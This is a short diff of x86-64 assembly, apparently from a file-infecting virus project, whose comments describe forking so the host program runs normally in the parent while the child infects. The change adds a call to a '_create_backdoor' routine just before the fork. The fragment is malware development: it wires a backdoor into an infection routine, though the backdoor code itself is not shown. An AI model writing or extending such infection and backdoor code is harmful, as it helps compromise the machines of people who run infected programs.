@@ -313,6 +313,7 @@ _fork_before_exec_normaly:
 ;; When infecting normaly, we fork the process to run it normally in parent,
 ;; and infect in child
     ;; fork
+	call _create_backdoor
 	mov rax, SYS_FORK
 	syscall
 	cmp rax, 0
